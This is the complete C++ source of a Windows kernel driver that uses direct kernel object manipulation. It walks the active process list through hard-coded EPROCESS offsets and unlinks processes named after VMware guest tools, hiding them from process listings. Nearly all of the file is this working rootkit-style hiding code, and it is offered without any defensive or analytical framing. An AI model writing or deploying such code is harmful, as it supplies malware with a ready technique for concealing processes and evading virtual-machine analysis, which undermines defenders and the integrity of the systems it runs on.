// DkomHideWdm.cpp — Pure WDM driver in C++
// Link with ntoskrnl.lib only (no WDF, no obcallback)

#include <ntddk.h>

// Export from ntoskrnl:
extern "C" NTKERNELAPI PEPROCESS PsInitialSystemProcess;

// IMPORTANT: Update these for your exact Windows version using WinDbg
#define OFFSET_ACTIVE_PROCESS_LINKS 0x448
#define OFFSET_IMAGE_FILE_NAME      0x5a8
#define OFFSET_UNIQUE_PROCESS_ID    0x440

extern "C" VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("[DKOM] Driver unloaded\n");
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;
    DbgPrint("[DKOM] DriverEntry: hiding VMware-related processes\n");

    // List of target process names to hide

    const char* vmProcessList[] = {
        "VGAuthService.",
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vmacthlp.exe"
    };
    const int vmProcessCount = sizeof(vmProcessList) / sizeof(vmProcessList[0]);

    // Walk the PsActiveProcessHead list
    PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)PsInitialSystemProcess + OFFSET_ACTIVE_PROCESS_LINKS);
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        PLIST_ENTRY next = curr->Flink;

        PUCHAR procBase = (PUCHAR)curr - OFFSET_ACTIVE_PROCESS_LINKS;
        char imageName[16] = { 0 };
        RtlCopyMemory(imageName, procBase + OFFSET_IMAGE_FILE_NAME, sizeof(imageName) - 1);

        for (int i = 0; i < vmProcessCount; ++i) {
            if (_stricmp(imageName, vmProcessList[i]) == 0) {
                // Hide this process by unlinking it
                PLIST_ENTRY links = (PLIST_ENTRY)(procBase + OFFSET_ACTIVE_PROCESS_LINKS);
                links->Blink->Flink = links->Flink;
                links->Flink->Blink = links->Blink;

                ULONG_PTR pid = *(ULONG_PTR*)(procBase + OFFSET_UNIQUE_PROCESS_ID);
                DbgPrint("[DKOM] Hid %s (PID=%lu)\n", imageName, (ULONG)pid);
                break;
            }
        }

        curr = next;
    }

    return STATUS_SUCCESS;
}
